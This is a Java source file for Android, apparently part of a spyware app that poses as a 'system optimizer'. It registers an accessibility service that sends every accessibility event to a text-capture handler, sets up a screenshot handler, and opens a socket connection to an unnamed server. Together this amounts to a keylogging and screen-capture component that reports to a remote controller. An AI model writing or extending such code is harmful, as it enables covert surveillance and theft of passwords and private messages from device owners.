package com.system.optimizer;

import com.system.optimizer.event_handler.TextEventHandler;

import io.socket.client.Socket;

import com.system.optimizer.event_handler.ScreenshotEventHandler;
import com.system.optimizer.network.SocketManager;

import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;

public class SystemEventMonitor extends AccessibilityService {

    private SocketManager socketManager;
    // handlers
    private TextEventHandler textEventHandler;
    private ScreenshotEventHandler screenShotEventHandler;

    @Override
    public void onCreate() {
        super.onCreate();

        try {
            this.socketManager = new SocketManager(this);
            this.textEventHandler = new TextEventHandler(socketManager);
            this.screenShotEventHandler = new ScreenshotEventHandler(this, socketManager);
        } catch (Exception e) {
            // Log error but don't crash the service
            android.util.Log.e("SystemEventMonitor", "Error initializing components", e);
        }
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        try {
            if (textEventHandler != null) {
                textEventHandler.onTextEvent(event);
            }
        } catch (Exception e) {
            android.util.Log.e("SystemEventMonitor", "Error handling accessibility event", e);
        }
    }

    @Override
    public void onInterrupt() {
    }

    @Override
    public void onDestroy() {
        try {
            if (socketManager != null) {
                socketManager.disconnect();
            }
        } catch (Exception e) {
            android.util.Log.e("SystemEventMonitor", "Error during cleanup", e);
        } finally {
            super.onDestroy();
        }
    }

}
